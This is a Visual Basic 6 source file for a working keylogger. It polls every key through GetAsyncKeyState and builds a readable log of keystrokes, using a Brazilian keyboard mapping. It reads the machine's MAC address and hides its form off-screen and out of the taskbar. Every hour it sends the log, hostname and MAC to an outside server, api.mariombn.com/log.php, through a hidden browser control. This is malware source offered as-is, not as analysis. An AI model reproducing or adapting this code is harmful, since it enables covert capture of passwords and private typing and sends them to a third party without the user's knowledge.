VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "SHDOCVW.dll"
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   525
   ClientLeft      =   -5445
   ClientTop       =   0
   ClientWidth     =   840
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   525
   ScaleWidth      =   840
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   480
      Top             =   5640
   End
   Begin VB.CommandButton cmdSendBuffer 
      Caption         =   "Send Buffer"
      Height          =   495
      Left            =   7920
      TabIndex        =   5
      Top             =   5520
      Width           =   1335
   End
   Begin SHDocVwCtl.WebBrowser web 
      Height          =   5415
      Left            =   10680
      TabIndex        =   4
      Top             =   120
      Width           =   4935
      ExtentX         =   8705
      ExtentY         =   9551
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.TextBox Text3 
      Height          =   4935
      Left            =   5400
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   120
      Width           =   5175
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Limpar Tudo"
      Height          =   495
      Left            =   9360
      TabIndex        =   2
      Top             =   5520
      Width           =   1215
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Top             =   5160
      Width           =   10575
   End
   Begin VB.TextBox Text1 
      Height          =   4935
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   5175
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   0
      Top             =   5640
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim globalhora As Integer
Dim result As Integer
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
'
'---------------------------------------------------------------------------
' Used to get the MAC address.
'---------------------------------------------------------------------------
'
Private Const NCBNAMSZ As Long = 16
Private Const NCBENUM As Long = &H37
Private Const NCBRESET As Long = &H32
Private Const NCBASTAT As Long = &H33
Private Const HEAP_ZERO_MEMORY As Long = &H8
Private Const HEAP_GENERATE_EXCEPTIONS As Long = &H4

Private Type NET_CONTROL_BLOCK  'NCB
    ncb_command    As Byte
    ncb_retcode    As Byte
    ncb_lsn        As Byte
    ncb_num        As Byte
    ncb_buffer     As Long
    ncb_length     As Integer
    ncb_callname   As String * NCBNAMSZ
    ncb_name       As String * NCBNAMSZ
    ncb_rto        As Byte
    ncb_sto        As Byte
    ncb_post       As Long
    ncb_lana_num   As Byte
    ncb_cmd_cplt   As Byte
    ncb_reserve(9) As Byte 'Reserved, must be 0
    ncb_event      As Long
End Type

Private Type ADAPTER_STATUS
    adapter_address(5) As Byte
    rev_major          As Byte
    reserved0          As Byte
    adapter_type       As Byte
    rev_minor          As Byte
    duration           As Integer
    frmr_recv          As Integer
    frmr_xmit          As Integer
    iframe_recv_err    As Integer
    xmit_aborts        As Integer
    xmit_success       As Long
    recv_success       As Long
    iframe_xmit_err    As Integer
    recv_buff_unavail  As Integer
    t1_timeouts        As Integer
    ti_timeouts        As Integer
    Reserved1          As Long
    free_ncbs          As Integer
    max_cfg_ncbs       As Integer
    max_ncbs           As Integer
    xmit_buf_unavail   As Integer
    max_dgram_size     As Integer
    pending_sess       As Integer
    max_cfg_sess       As Integer
    max_sess           As Integer
    max_sess_pkt_size  As Integer
    name_count         As Integer
End Type

Private Type NAME_BUFFER
    name_(0 To NCBNAMSZ - 1) As Byte
    name_num                 As Byte
    name_flags               As Byte
End Type

Private Type ASTAT
    adapt             As ADAPTER_STATUS
    NameBuff(0 To 29) As NAME_BUFFER
End Type

Private Declare Function Netbios Lib "netapi32" _
        (pncb As NET_CONTROL_BLOCK) As Byte

Private Declare Sub CopyMemory Lib "kernel32" _
        Alias "RtlMoveMemory" (hpvDest As Any, ByVal _
        hpvSource As Long, ByVal cbCopy As Long)

Private Declare Function GetProcessHeap Lib "kernel32" () As Long

Private Declare Function HeapAlloc Lib "kernel32" _
        (ByVal hHeap As Long, ByVal dwFlags As Long, _
        ByVal dwBytes As Long) As Long
     
Private Declare Function HeapFree Lib "kernel32" _
        (ByVal hHeap As Long, ByVal dwFlags As Long, _
        lpMem As Any) As Long

Private Sub cmdSendBuffer_Click()
    Call sendbuffer
    Call Command1_Click
End Sub

Private Function fGetMacAddress() As String
    Dim l As Long
    Dim lngError As Long
    Dim lngSize As Long
    Dim pAdapt As Long
    Dim pAddrStr As Long
    Dim pASTAT As Long
    Dim strTemp As String
    Dim strAddress As String
    Dim strMACAddress As String
    Dim AST As ASTAT
    Dim NCB As NET_CONTROL_BLOCK

    '
    '---------------------------------------------------------------------------
    ' Get the network interface card's MAC address.
    '----------------------------------------------------------------------------
    '
    On Error GoTo ErrorHandler
    fGetMacAddress = ""
    strMACAddress = ""

    '
    ' Try to get MAC address from NetBios. Requires NetBios installed.
    '
    ' Supported on 95, 98, ME, NT, 2K, XP
    '
    ' Results Connected Disconnected
    ' ------- --------- ------------
    '   XP       OK         Fail (Fail after reboot)
    '   NT       OK         OK   (OK after reboot)
    '   98       OK         OK   (OK after reboot)
    '   95       OK         OK   (OK after reboot)
    '
    NCB.ncb_command = NCBRESET
    Call Netbios(NCB)

    NCB.ncb_callname = "*               "
    NCB.ncb_command = NCBASTAT
    NCB.ncb_lana_num = 0
    NCB.ncb_length = Len(AST)

    pASTAT = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS Or _
                       HEAP_ZERO_MEMORY, NCB.ncb_length)
    If pASTAT = 0 Then GoTo ErrorHandler

    NCB.ncb_buffer = pASTAT
    Call Netbios(NCB)

    Call CopyMemory(AST, NCB.ncb_buffer, Len(AST))

    strMACAddress = Right$("00" & Hex(AST.adapt.adapter_address(0)), 2) & _
                    Right$("00" & Hex(AST.adapt.adapter_address(1)), 2) & _
                    Right$("00" & Hex(AST.adapt.adapter_address(2)), 2) & _
                    Right$("00" & Hex(AST.adapt.adapter_address(3)), 2) & _
                    Right$("00" & Hex(AST.adapt.adapter_address(4)), 2) & _
                    Right$("00" & Hex(AST.adapt.adapter_address(5)), 2)

    Call HeapFree(GetProcessHeap(), 0, pASTAT)

    fGetMacAddress = strMACAddress
    GoTo NormalExit

ErrorHandler:
    Call MsgBox(Err.Description, vbCritical, "Error")

NormalExit:
    End Function


Private Sub Command1_Click()
    Text1.Text = ""
    Text2.Text = ""
    Text3.Text = ""
    Text2.SetFocus
End Sub

Private Sub Form_Activate()
    Text2.SetFocus
End Sub

Private Sub Form_Load()
    globalhora = 1
End Sub

Private Sub Timer1_Timer()
    Dim i As Integer
    For i = 1 To 255
        result = 0
        result = GetAsyncKeyState(i)
        If result = -32767 Then
            'Text1.Text = Text1.Text + Chr(i)
            Text1.Text = Text1.Text & "[" & i & "]"
            Text3.Text = Text3.Text & convertChar(i)
        End If
    Next i
End Sub

Private Function convertChar(key) As String
    Dim retorno As String
    
    'Verifica se é uma das letras
    If key >= 65 And key <= 90 Then
        retorno = Chr(key)
    End If
    If key >= 48 And key <= 57 Then
        retorno = Chr(key)
    End If
    
    Select Case key
        Case 96
            retorno = "[N0]"
        Case 97
            retorno = "[N1]"
        Case 98
            retorno = "[N2]"
        Case 99
            retorno = "[N3]"
        Case 100
            retorno = "[N4]"
        Case 101
            retorno = "[N5]"
        Case 102
            retorno = "[N6]"
        Case 103
            retorno = "[N7]"
        Case 104
            retorno = "[N8]"
        Case 105
            retorno = "[N9]"
        Case 13
            retorno = "[ENTER]"
        Case 8
            retorno = "[BSPACE]"
        Case 160
            retorno = "[LSHIFT]"
        Case 161
            retorno = "[RSHIFT]"
        Case 188
            retorno = ","
        Case 190
            retorno = "."
        Case 191
            retorno = ";"
        Case 186
            retorno = "Ç"
        Case 222
            retorno = "~"
        Case 220
            retorno = "]"
        Case 219
            retorno = "´"
        Case 221
            retorno = "["
        Case 20
            retorno = "[CLOCK]"
        Case 9
            retorno = "[TAB]"
        Case 192
            retorno = "'"
        Case 187
            retorno = "="
        Case 189
            retorno = "-"
        Case 164
            retorno = "[LALT]"
        Case 91
            retorno = "[LWIN]"
        Case 165
            retorno = "[RALT]"
    End Select


    
    convertChar = retorno
    
End Function

Private Sub sendbuffer()
    Dim hostname As String
    Dim macadress As String
    Dim buffer As String
    Dim link As String
    
    hostname = "HOSTNAME"
    macadress = fGetMacAddress()
    buffer = Text3.Text
    
    link = "http://api.mariombn.com/log.php?host=" & hostname & "&mac=" & macadress & "&id=NDA&buffer=" & buffer
    web.Navigate (link)
End Sub

Private Sub Timer2_Timer()
    globalhora = globalhora + 1
    If globalhora >= 3600 Then
    'If globalhora <= 3 Then
        Call sendbuffer
        Call Command1_Click
        globalhora = 1
    End If
End Sub
